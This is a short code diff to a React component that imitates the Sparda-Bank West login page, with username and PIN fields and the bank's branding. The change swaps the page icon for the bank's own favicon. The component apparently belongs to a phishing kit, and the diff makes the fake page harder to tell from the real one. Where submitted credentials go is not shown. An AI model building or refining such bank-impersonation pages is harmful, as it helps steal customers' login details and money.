@@ -6,6 +6,7 @@ import { usePageMeta } from "@/hooks/use-page-meta";
 import { Eye, EyeOff, ArrowRight, TriangleAlert } from "lucide-react";
 import germanyFlag from "@/assets/germany-flag.svg.asset.json";
 import logoAsset from "@/assets/sparda-logo.avif.asset.json";
+import faviconAsset from "@/assets/favicons/spardabank.webp.asset.json";
 import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";
 
 const BLUE = "#0056a3";
@@ -28,7 +29,7 @@ const SpardaBankDe = () => {
   const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);
+  usePageMeta("Sparda-Bank West - Anmelden", faviconAsset.url);
 
   const submit = async () => {
     const uErr = username.trim() === "";
